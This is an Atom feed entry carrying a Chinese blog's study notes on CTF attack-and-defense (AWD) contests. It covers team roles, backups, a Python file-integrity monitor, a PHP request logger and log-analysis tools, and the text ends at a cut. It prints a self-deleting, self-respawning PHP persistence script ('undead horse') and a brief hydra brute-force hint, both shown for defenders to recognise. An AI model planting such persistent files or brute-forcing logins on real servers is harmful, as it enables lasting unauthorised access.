    <summary type="html">&lt;h1 id=&quot;CTF-AWD模式下简单的CMS代码审计&quot;&gt;&lt;a href=&quot;#CTF-AWD模式下简单的CMS代码审计&quot; class=&quot;headerlink&quot; title=&quot;CTF AWD模式下简单的CMS代码审计&quot;&gt;&lt;/a&gt;CTF AWD模式下简单的CMS代码审计&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="攻防" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>ctf线下AWD攻防赛学习笔记</title>
    <link href="https://lhhxs.github.io/2022/09/07/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://lhhxs.github.io/2022/09/07/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-09-07T00:32:08.000Z</published>
    <updated>2022-09-09T14:24:18.713Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctf线下AWD攻防赛学习笔记"><a href="#ctf线下AWD攻防赛学习笔记" class="headerlink" title="ctf线下AWD攻防赛学习笔记"></a>ctf线下AWD攻防赛学习笔记</h1><p>CTF线下攻防赛主要以攻防模式（Attack &amp; Defense）来呈现。一般在这种模式下，一支参赛队伍有三名队员，所有的参赛队伍都会有同样的初始环境，包含若干台服务器。参赛队伍挖掘漏洞，通过攻击对手的服务器获取Flag来得分，以修补自身服务器的漏洞防止扣分。</p><p>在这种赛制中，不仅仅是比参赛队员的智力和技术，同时也比团队之间的分工配合与合作。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2Jsb2cubnNmb2N1cy5uZXQvd3AtY29udGVudC91cGxvYWRzLzIwMTkvMDUvMDUxZGY3YWVmNTE3Zjc0OTZhMDNhODQxYjIwOTUxMzQucG5n?x-oss-process=image/format,png" alt="image"><br><strong>具体步骤可以看我的<a href="https://blog.csdn.net/qq_43442524/article/details/102652029">这篇文章</a></strong></p><h2 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h2><ol><li>语言常见漏洞题目</li></ol><p>PHP语言居多</p><p>Python 模板注入(SSTI)：直接利用漏洞执行命令获得Flag、绕过关键字限制。</p><p>Nodejs 任意文件读取：直接读取Flag。</p><p>PHP 各类漏洞：文件包含、反序列化、文件上传、注入、代码执行、命令执行</p><ol start="2"><li><p>后门漏洞</p></li><li><p>公开CMS漏洞</p></li></ol><p>DZ SSRF漏洞、小众CMS 0day、出题人自己改&#x2F;写的CMS。</p><ol start="4"><li>文件上传漏洞</li></ol><p>filelocation</p><ol start="5"><li>文件包含漏洞</li></ol><h2 id="分工"><a href="#分工" class="headerlink" title="分工"></a>分工</h2><p>在线下攻防赛中一般需要两名队员作为攻击者来进行漏洞挖掘、权限维持、探查网络、漏洞利用、自动化攻击、自动化提交等。这两名队员中要有一个代码编写能力比较强的人，其主要作用是在短时间内构造出能批量提交、自动化攻击的脚本程序，避免浪费人力在提交Flag上。另一名队员充当防护者的角色进行漏洞修复、后门排查、文件监控、弱口令排查等。</p><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>防护一般情况下分为漏洞修复、文件备份、后门排查、文件监控、弱口令排查等。</p><p>漏洞修复即在攻击者角色找到了可以攻击的点之后，在相应的代码处进行过滤、修复。</p><p>文件备份即在开始进行比赛的时候一定要对原始数据进行备份，这样可以防止服务器相关Web文件被删除导致服务Down掉之后可以自行恢复（一般在线下比赛服务Down掉会持续扣分，而重启一次服务会扣掉大量分数）。</p><p>后门排查分为两种情况：第一种为主办方为了照顾水平比较低的选手而留下的隐藏后门，第二种为其他参赛队伍通过漏洞取得服务器一定权限后留下来的后门。针对第一种情况可以开始比赛时把备份文件在后门排查工具里（如D盾、河马）进行一次WebShell审查，找到主办方留下的后门，删除即可</p><p>但是也有可能主办方留下了一个免杀马，在这种情况下，如果有外网可以把源代码下载下来，把官方源代码和比赛源代码进行一次diff，这种办法基本上可以找出所有主办方留下的WebShell。也可以利用这种方式帮助攻击者进行漏洞挖掘，因为如果不是已知公开的漏洞，主办方都会在源代码里进行更改，达到可以GetShell的目的。针对第二种情况要看攻击者留下了什么类型的后门，如果是普通的WebShell一句话或者变种的一句话木马，那么直接删除即可。如果是不死马+内存马就会比较麻烦，因为在线下攻防赛中一般不是root权限，所以是没有权限杀死进程的。一般的不死马都是通过循环创建WebShell文件，如果不杀死进程的话会一直创建下去，但是也会有延时性，可以通过这种延时性写一个暴力循环删除的脚本来达到删除的目的</p><p>常见不死马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>); </span><br><span class="line">    <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.config.php&quot;</span>, <span class="title function_ invoke__">mktime</span>(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>文件监控即是要针对攻击者在服务器上创建的任何文件有一个告警或者阻断的操作，要保持服务器的文件不被删除，不允许上传或者创建文件。网上有相应的文件监控的脚本，可以参考学习。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#use: python file_check.py ./</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> ntpath</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      <span class="comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span></span><br><span class="line">bakstring = <span class="string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span></span><br><span class="line">logstring = <span class="string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">webshellstring = <span class="string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span></span><br><span class="line">difffile = <span class="string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span></span><br><span class="line"></span><br><span class="line">Special_string = <span class="string">&#x27;drops_log&#x27;</span>  <span class="comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="string">r&quot;\?%02x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    <span class="string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isListLike</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(value, (<span class="built_in">list</span>, <span class="built_in">tuple</span>, <span class="built_in">set</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取Unicode编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUnicode</span>(<span class="params">value, encoding=<span class="literal">None</span>, noneToNull=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> noneToNull <span class="keyword">and</span> value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> NULL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isListLike(value):</span><br><span class="line">        value = <span class="built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="keyword">for</span> _ <span class="keyword">in</span> value)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, unicode):</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> unicode(value, encoding <span class="keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="built_in">ord</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> unicode(value)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">return</span> unicode(<span class="built_in">str</span>(value), errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录创建</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mkdir_p</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">import</span> errno</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">if</span> exc.errno == errno.EEXIST <span class="keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilelist</span>(<span class="params">cwd</span>):</span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> root,subdirs, files <span class="keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="keyword">for</span> filepath <span class="keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcMD5</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            <span class="built_in">hash</span> = md5obj.hexdigest()</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">hash</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">        <span class="built_in">print</span> getUnicode(e)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfilemd5dict</span>(<span class="params">filelist = []</span>):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> ori_file <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="keyword">return</span> filemd5dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份所有文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup_file</span>(<span class="params">filelist=[]</span>):</span><br><span class="line">    <span class="comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span></span><br><span class="line">    <span class="keyword">for</span> filepath <span class="keyword">in</span> filelist:</span><br><span class="line">        <span class="keyword">if</span> Special_path_str <span class="keyword">not</span> <span class="keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="string">&#x27;bak&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;---------start------------&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;[*] pre work end!&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = <span class="built_in">list</span>(<span class="built_in">set</span>(file_list) ^ <span class="built_in">set</span>(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(diff_file_list) != <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="keyword">for</span> filepath <span class="keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="string">&#x27; : &#x27;</span> + <span class="built_in">str</span>(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="keyword">for</span> filekey <span class="keyword">in</span> md5_dict:</span><br><span class="line">            <span class="keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    f = <span class="built_in">open</span>(filekey, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> Special_string <span class="keyword">not</span> <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="string">&#x27;.txt&#x27;</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        f = <span class="built_in">open</span>(os.path.join(Special_path[<span class="string">&#x27;log&#x27;</span>], <span class="string">&#x27;log.txt&#x27;</span>), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                        f.write(<span class="string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span> <span class="string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime()) </span></span><br></pre></td></tr></table></figure><p>弱口令排查即是主办方给的服务器为弱口令，或者自己服务器内部Web服务内存在弱口令，针对这种情况一定要及时更改弱口令，做好弱口令检查。</p><p>nmap 扫描 22<br><code>hydra -user -p</code><br>字典生成工具: <a href="https://blog.csdn.net/qq_33936481/article/details/51277679">参考网站</a></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析:"></a>日志分析:</h2><p>在线下攻防模式中日志分析是非常重要的一环，日志分析一般是在比赛正式开始之后进行的对其他攻击者的流量进行分析提取有用的信息，通过查看其他队伍打过来的流量可以分析到他们留下的WebShell文件名、漏洞利用方式、漏洞产生的点，方便自己进行攻击。因为主办方可能会不允许选手查看日志文件，再加上日志文件不会对POST的数据进行分析打印，所以我们在进行日志监控、流量分析时，一定要提前准备好自己的监控脚本，对Web服务进行监控、分析，这样才可以抓取到完整的其他队伍打过来的流量，方便自己审查。</p><h3 id="日志分析的用途"><a href="#日志分析的用途" class="headerlink" title="日志分析的用途"></a>日志分析的用途</h3><p>感知可能正在发生的攻击，从而规避存在的安全风险<br>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失<br>记录log脚本<br>这种脚本网上有很多。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"><span class="variable">$ip</span>       = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]; <span class="comment">//记录访问者的ip</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];<span class="comment">//访问者要访问的文件名</span></span><br><span class="line"><span class="variable">$parameter</span>   = <span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]; <span class="comment">//访问者要请求的参数</span></span><br><span class="line"><span class="variable">$time</span>     =   <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">time</span>()); <span class="comment">//访问时间</span></span><br><span class="line"><span class="variable">$logadd</span> = <span class="string">&#x27;来访时间：&#x27;</span>.<span class="variable">$time</span>.<span class="string">&#x27;--&gt;&#x27;</span>.<span class="string">&#x27;访问链接：&#x27;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$ip</span>.<span class="variable">$filename</span>.<span class="string">&#x27;?&#x27;</span>.<span class="variable">$parameter</span>.<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line"><span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;log.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fh</span>, <span class="variable">$logadd</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具:"></a>日志分析工具:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LogForensics 腾讯实验室</span><br><span class="line">https://security.tencent.com/index.php/opensource/detail/15</span><br><span class="line">北风飘然@金乌网络安全实验室</span><br><span class="line">http://www.freebuf.com/sectool/126698.html</span><br><span class="line">网络ID为piaox的安全从业人员：</span><br><span class="line">http://www.freebuf.com/sectool/110644.html</span><br><span class="line">网络ID：SecSky</span><br><span class="line">http://www.freebuf.com/sectool/8982.html</span><br><span class="line">网络ID：鬼魅羊羔</span><br><span class="line">http://www.freebuf.com/articles/web/96675.html </span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" 